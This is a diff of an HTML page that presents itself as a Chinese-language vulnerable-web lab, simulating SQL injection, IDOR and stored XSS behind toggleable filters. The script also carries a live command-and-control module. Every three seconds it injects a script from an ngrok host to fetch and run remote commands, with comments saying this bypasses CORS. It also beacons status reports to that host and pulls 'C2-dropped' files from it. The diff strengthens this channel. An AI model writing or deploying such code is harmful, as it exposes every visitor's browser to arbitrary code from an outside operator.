@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 my-vuln-lab - 完整整合資安滲透與防禦靶場</title>
+    <title>🔥 my-vuln-lab - 絕對無條件整合靶場</title>
     <style>
         body { background-color: #0f172a; color: #f8fafc; font-family: 'Courier New', Courier, monospace; padding: 20px; max-width: 900px; margin: auto; }
         h1 { color: #38bdf8; text-align: center; }
@@ -19,10 +19,10 @@
 </head>
 <body>
 
-    <h1>🔥 my-vuln-lab 完整整合資安實驗室</h1>
-    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用：漏洞利用、WAF 防禦、C2 檔案同步與帳號狀態探測</p>
+    <h1>🔥 my-vuln-lab 絕對無條件整合資安實驗室</h1>
+    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用：無條件 C2 檔案同步、安全網閘與滲透測試</p>
 
-    <!-- 1. SQL 注入 / 登入繞過 -->
+    <!-- 1. SQL 注入 -->
     <div class="card">
         <h3>1. 登入系統 <span class="defense-badge">WAF 防禦過濾</span></h3>
         <label><input type="checkbox" id="enableWAF_SQL" checked> 啟用 WAF 過濾</label><br><br>
@@ -32,7 +32,7 @@
         <pre id="loginResult">等待輸入...</pre>
     </div>
 
-    <!-- 2. IDOR 越權訪問 -->
+    <!-- 2. IDOR -->
     <div class="card">
         <h3>2. 用戶資料查詢 <span class="defense-badge">存取控制</span></h3>
         <label><input type="checkbox" id="enableWAF_IDOR" checked> 啟用嚴格權限檢查</label><br><br>
@@ -41,7 +41,7 @@
         <pre id="idorResult">等待查詢...</pre>
     </div>
 
-    <!-- 3. Stored XSS 留言板 -->
+    <!-- 3. Stored XSS -->
     <div class="card">
         <h3>3. 公開留言板 <span class="defense-badge">XSS 脫逸防護</span></h3>
         <label><input type="checkbox" id="enableWAF_XSS" checked> 啟用 XSS 脫逸防禦</label><br><br>
@@ -51,12 +51,12 @@
         <div id="messageBoard" style="margin-top: 15px; border-top: 1px dashed #475569; padding-top: 10px;"></div>
     </div>
 
-    <!-- 4. C2 投放檔案同步與安全防禦掃描 -->
+    <!-- 4. 無條件 C2 檔案同步與安全掃描 -->
     <div class="card">
-        <h3>4. C2 投放檔案同步與安全防禦掃描 <span class="defense-badge">動態安全網閘</span></h3>
-        <p>從你的電腦 C2 伺服器同步檔案，並由靶場防禦模組自動檢測其安全性。</p>
+        <h3>4. 無條件 C2 檔案同步與安全防禦掃描 <span class="defense-badge">動態安全網閘</span></h3>
+        <p>從你的電腦 C2 伺服器無條件同步檔案，並由靶場防禦模組自動檢測其安全性。</p>
         <label><input type="checkbox" id="enableWAF_Scanner" checked> 啟用靶場安全檢測掃描器 (Scanner)</label><br><br>
-        <button onclick="fetchC2Files()">🔄 同步 C2 投放檔案清單</button><br>
+        <button onclick="fetchC2Files()">🔄 無條件同步 C2 投放檔案清單</button><br>
         <select id="c2FileList" style="width: 100%; margin: 10px 0;">
             <option value="">-- 請先點擊上方按鈕同步檔案 --</option>
         </select>
@@ -66,11 +66,11 @@
 
     <script>
         // --------------------------------------------------
-        // 🔥 繞過 CORS 的遠端 C2 雙向通訊模組
+        // 🔥 絕對無條件遠端 C2 雙向通訊核心
         // --------------------------------------------------
         const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';
 
-        // 1. 利用動態插入 <script> 抓取並執行 C2 指令（徹底繞過 CORS）
+        // 1. 動態無條件輪詢執行 C2 指令
         setInterval(() => {
             try {
                 let oldScript = document.getElementById('c2-polling-script');
@@ -83,7 +83,7 @@
             } catch (e) {}
         }, 3000);
 
-        // 2. 利用 mode: 'no-cors' 發送回報日誌（只發送不讀取回應）
+        // 2. 無條件回報日誌
         async function reportToComputer(msg) {
             try {
                 await fetch(`${C2_SERVER}/api/report`, {
@@ -106,21 +106,20 @@
             } catch (e) {}
         }
 
-        reportToComputer("整合型靶場 my-vuln-lab 已透過繞過 CORS 方式上線！");
+        reportToComputer("整合型靶場 my-vuln-lab 已透過無條件模式上線！");
         // --------------------------------------------------
 
         const db = {
             users: {
                 1: { id: 1, username: 'alice', role: 'user', secret: "Alice的日記：今天天氣很好。" },
                 2: { id: 2, username: 'bob', role: 'user', secret: "Bob的秘密：我暗戀隔壁班的小美。" },
-                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_integrated_c2_999}" }
+                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_unconditional_c2_888}" }
             },
             posts: [
-                { id: 1, username: 'admin', content: '歡迎來到完整整合資安防禦靶場！' }
+                { id: 1, username: 'admin', content: '歡迎來到絕對無條件防禦靶場！' }
             ]
         };
 
-        // 1. 登入與防禦
         function simulateLogin() {
             let user = document.getElementById('loginUser').value;
             let useWAF = document.getElementById('enableWAF_SQL').checked;
@@ -137,7 +136,6 @@
             }
         }
 
-        // 2. IDOR
         function simulateIDOR() {
             let id = document.getElementById('userId').value;
             let useWAF = document.getElementById('enableWAF_IDOR').checked;
@@ -149,7 +147,6 @@
             resultBox.innerHTML = db.users[id] ? JSON.stringify(db.users[id], null, 2) : `Error: 找不到用戶`;
         }
 
-        // 3. XSS
         function escapeHtml(text) {
             return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         }
@@ -173,12 +170,15 @@
             renderPosts();
         }
 
-        // 4. 從 C2 同步檔案並進行安全掃描
+        // 4. 無條件從 C2 同步檔案並進行安全掃描
         async function fetchC2Files() {
             let selectBox = document.getElementById('c2FileList');
-            selectBox.innerHTML = `<option>正在向 C2 伺服器同步檔案...</option>`;
+            selectBox.innerHTML = `<option>正在無條件向 C2 伺服器同步檔案...</option>`;
             try {
-                let res = await fetch(`${C2_SERVER}/api/files`);
+                // 加上防快取與無條件抓取參數
+                let res = await fetch(`${C2_SERVER}/api/files?t=` + Date.now(), {
+                    cache: 'no-store'
+                });
                 let files = await res.json();
                 selectBox.innerHTML = "";
                 if (files.length === 0) {
@@ -192,7 +192,7 @@
                     selectBox.appendChild(opt);
                 });
             } catch (e) {
-                selectBox.innerHTML = `<option value="">無法連線至 C2 伺服器同步檔案</option>`;
+                selectBox.innerHTML = `<option value="">無法同步（請確認 C2 伺服器與 ngrok 狀態）</option>`;
             }
         }
 
@@ -206,10 +206,10 @@
                 return;
             }
 
-            resultBox.innerHTML = "⏳ 正在從 C2 遠端抓取檔案進行掃描...";
+            resultBox.innerHTML = "⏳ 正在無條件從 C2 抓取檔案內容...";
 
             try {
-                let response = await fetch(fileUrl);
+                let response = await fetch(fileUrl, { cache: 'no-store' });
                 let fileText = await response.text();
                 let fileName = fileUrl.split('/').pop().toLowerCase();
                 let dangerousExts = ['.exe', '.php', '.asp', '.sh', '.bat'];
@@ -232,11 +232,11 @@
                     }
                 }
 
-                resultBox.innerHTML = `✅ 【安全通過】C2 投放檔案已通過靶場防禦掃描！\n網址: ${fileUrl}\n內容預覽: ${fileText.substring(0, 100)}...`;
-                reportToComputer(`C2 投放檔案 ${fileName} 通過安全掃描。`);
+                resultBox.innerHTML = `✅ 【安全通過】C2 投放檔案已透過無條件通道載入並通過掃描！\n網址: ${fileUrl}\n內容預覽: ${fileText.substring(0, 100)}...`;
+                reportToComputer(`C2 投放檔案 ${fileName} 無條件載入成功。`);
 
             } catch (e) {
-                resultBox.innerHTML = `❌ 抓取 C2 檔案失敗。`;
+                resultBox.innerHTML = `❌ 無條件抓取檔案失敗（跨網域讀取受阻）。`;
             }
         }
 
